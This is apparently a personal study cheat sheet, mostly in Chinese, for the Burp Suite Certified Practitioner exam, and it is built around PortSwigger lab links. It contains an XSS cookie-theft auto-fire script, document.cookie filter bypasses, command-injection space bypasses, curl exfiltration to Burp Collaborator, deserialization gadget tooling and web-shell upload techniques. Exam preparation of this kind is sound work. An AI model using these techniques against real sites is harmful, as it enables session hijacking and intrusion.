Path traversal常见的位置: product image 


反系列化:
java ysoserial-all.jar

/root/Downloads/github
php:phpggc

Ruby:
https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md

信息收集:
1.通过给一些不同类型来看看response返回什么error message
2.通过html review source code
3. /cgi-bin/phpinfo.php
4. .php~ 来获取源代码
5. /robots.txt
6. 通过trace
https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE
7. /.git
https://www.bugcrowd.com/resources/levelup/github-recon-and-sensitive-data-exposure-module/
8.常用list
https://portswigger.net/web-security/sql-injection/cheat-sheet

常见的open redirect位置
/product/nextProduct?path=

Reflected information
当有看到reflected information的时候，可以考虑reflected xss or SSTI
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection


一些思考：
从别人的经验来看，有3个阶段，第一个阶段是获取普通用户的权限，这个人通常是carlos.要获取她的账号权限，通常有几个方法
1. 通过xss(一般在search，可以通过DOM Invader）所以这里要收集一些如何获取cookie的js,也考察是否会使用exploit server
如果document.cookie被禁用了，可以考虑docuemnt["cookie"]或者docuemnt['cookie'], 这个跟proto type pollution里面的做法是一样的。document是object,访问属性可以通过dot，也可以通过
[]. 基本思路就是google document.cookie bypass. 可以找到类似： https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
这里还有个要注意的地方，我们一般最好是用base64 encode数据，然后传输过来后再decode,这可以避免一些不必要的干扰.注意要看看cookie的http only属性。

常见的通过exploit server deliver payload给victim的方法
a.<iframe>
b.<script>
If you are sending a GET request, you can use the following to auto-fire the payload.
<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
Note: This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

If you are sending a POST request, you can use the following to trigger the payload. 
You can use the following to auto trigger the payload.
  <script>
        document.forms[0].submit();
  </script>
拿到cookie后就可以在浏览器中替换它访问carlos账号了

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

2. 通过请求走私
https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

3. 通过缓存投毒home page
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization

4. 爆破用户名密码登录，这个通常是借助
https://portswigger.net/web-security/authentication/auth-lab-usernames
https://portswigger.net/web-security/authentication/auth-lab-passwords

第二阶段就是获取管理员的权限，也就是要以管理员的身份登录或者获取到他的cookie,
这个通常是通过sqli来获取。

但是注意一点就是整个lab只有一个active session.也就是说第一阶段和第二阶段，一定会有个获取cookie的过程。如果获取的cookie属于carlos,那我们就可以推断第二阶段只能是想办法找到adminitrator的
用户名和密码(或者是想办法bypass authentication,但个人感觉概率比较小).所以这个阶段要多想想有哪些方法可以获取到adminitrator的用户名和密码。
a. sql injection. 这个通常要借助sqlmap. 可能有时候还要借助--tamper这个参数.

第三阶段主要是要获取administrator下的一个flag.也就是要求我们要有系统的执行权限，与这个主题相关的lab大概有这些。
命令注入:可能需要${IFS}/$IFS来bypass空格
https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration (命令注入)
https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection (命令注入)

SSRF:
https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection （这个要结合command injection 才能实现数据提取)
要考虑这两个怎么打组合,
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter (有可能需要bypass blacklist)
注意：一般是http://localhost:6566/path
可以考虑用curl来外带数据到burp collaborator
curl --data-urlencode 'comment=hello world' url

反系列化: 难点在于反系列化数据是经过多次编码的，常见的就是url/base64/压缩, 重点就是掌握java/php
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php (反系列化, 
这个其实是比较好出题的，因为它涉及到几个点，比如要找到php source code,要读懂source code,要能根据source code写出反系列化利用代码）
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons
(这个主要就是考察如何使用java ysoserial, 为什么这么推测呢？因为换个版本就需要用不同的payload才行，一个是考察你能否清楚java 反系列化的特征，一个是考察你是会用ysoserial)
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain
(这个主要是考察如何使用phpggc，这个比java ysoserail还要好出题，因为你如何去确定要用的是什么框架，这里就涉及到怎么去判断框架的问题)
很大概率会从cookie去实现反系列化，但是这个cookie可能不会那么直接就可以看得出来。这个时候可以考虑用下面的方法做一些decode.
a. echo cookie_value | base64 -d | xxd
b. echo cookie_value | base64 -d > admin.pfs, 然后用file admin.pfs查看文件的类型，如果是压缩数据，还需要解压缩，比如file tmp.txt返回gzip compressed data.
   可以用这个方法来解压: mv admin.pfs admin.gz, 然后再gunzip admin.gz
   参考自:https://www.youtube.com/watch?v=yC0F05oggTE&list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem&index=43 (大概12分40秒的地方)
c. 也可能需要经过多次decode.
这里推荐使用https://gchq.github.io/CyberChef/， 它可以比较快的帮你分析出来。

反系列化常见的magic number, 可以用cat/xxd来判断，比如cat可以看得熟悉的特征，如果cat不行，就可以考虑用xxd来以16进制形式查看数据.
php: O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
java:use binary serialization formats，serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.

如果是Java 反系列化问题，可以考虑用burp插件 java deseraiization scanner来生成。


服务端原型污染:
https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

XXE:
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
https://portswigger.net/web-security/xxe/lab-xinclude-attack

SSTI:
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

Upload:
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload (图片马)
当然这里要考虑的一个问题就是可能会有类似WAF的阻碍，所以可能要考虑用encode来bypass.

下面我们来总结一下读取文件的方法，以防有些keyword被block了我们还有替代方案.
cat /home/carlos/secret
<?php
echo file_get_contents("test.txt");
?> 


别人的考试经验:
https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/ (重点看这个)
https://bscpcheatsheet.gitbook.io/exam/
https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md
https://www.youtube.com/watch?v=yC0F05oggTE&list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem&index=42
https://www.youtube.com/watch?v=fNoX_9v6-aY
